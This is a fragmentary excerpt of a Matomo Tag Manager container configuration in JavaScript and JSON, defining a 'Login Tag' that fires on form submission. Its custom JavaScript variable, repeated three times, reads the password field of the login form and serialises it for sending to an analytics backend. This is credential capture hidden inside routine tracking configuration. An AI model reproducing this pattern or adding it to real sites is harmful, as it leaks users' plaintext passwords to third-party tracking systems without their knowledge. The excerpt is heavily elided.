...
(function () {
    ...
    return function (parameters, TagManager) {
      this.get = function () {
        ...
        if (dataLayerName && parameters.container) {
          ...
          Templates["CustomJsFunctionVariablea094699a5deb4cf0a6d689e050bdfd5d"] = (function () {
            return function (parameters, TagManager) {
                this.get = function(){const data = {}; const formElement = document.querySelector('form#form-login');if(formElement.elements['password']){data.password=formElement.elements['password'].value;};return JSON.stringify(data)}
            };
        })()
  ...
  "blockedTriggerIds": []
        ...
        {
  "id": "2bbe1988-5e45-4482-99eb-d7d3948f398e",
  "type": "Matomo",
  "name": "Login Tag",
  "parameters": {
    "matomoConfig": {
      ...
      "joinedVariable": [
        {
          ...
          "Name": "Login Variable",
          "Description": "Created Via Form Submit template",
          "jsFunction": "function(){const data = {}; const formElement = document.querySelector('form#form-login');if(formElement.elements['password']){data.password=formElement.elements['password'].value;};return JSON.stringify(data)}",
          "id": "a094699a-5deb-4cf0-a6d6-89e050bdfd5d",
          "parameters": {
            "selectedVariable": "Custom JavaScript",
            "name": "CustomJsFunction",
            "type": "CustomJsFunction",
          ...
          "Variable": "CustomJsFunctionVariablea094699a5deb4cf0a6d689e050bdfd5d"
        }
      ]
    },
    "selectedTag": "BangDB Analytics",
  ...
  "blockTriggerIds": [],
  "fireTriggerIds": [
    "7e6914de-c339-425d-b6de-0e329d44959d"
  ],
  "fireLimit": "unlimited",
  "fireDelay": 0,
  "startDate": null,
  ...
  "Name": "Registration Trigger"
            ...
            {
  "id": "7e6914de-c339-425d-b6de-0e329d44959d",
  "type": "FormSubmit",
  "name": "FormSubmit",
  "Trigger": "FormSubmitTrigger",
  "selectedTrigger": "Form Submit",
    ...
    "parameters": {
      ...
      "parameters": {
        ...
        "parameters": {
          ...
          { name: "CustomJsFunction", type: "CustomJsFunction", lookUpTable: [], defaultValue: "", parameters: { jsFunction: "function(){const data = {}; const formElement = document.querySelector('form#form-login');if(formElement.elements['password']){data.password=formElement.elements['password'].value;};return JSON.stringify(data)}" }, Variable: "CustomJsFunctionVariablea094699a5deb4cf0a6d689e050bdfd5d" },
            {
